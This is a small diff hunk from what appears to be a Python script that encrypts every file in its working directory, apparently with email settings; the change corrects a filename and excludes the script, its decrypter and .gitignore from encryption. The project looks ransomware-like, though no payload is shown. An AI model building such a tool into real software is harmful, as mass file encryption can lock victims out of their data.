@@ -13,7 +13,7 @@ EMAİL_SERVER_PORT = 587 # gmail: 587
 
 def get_files():
     files = []
-    non_encrptfiles = ["encrpyter.py","LICENCE","README.md"]
+    non_encrptfiles = ["encrypter.py","LICENCE","README.md",".gitignore","decrypter.py"]
     for file in os.listdir():
         if file in non_encrptfiles:
             continue 
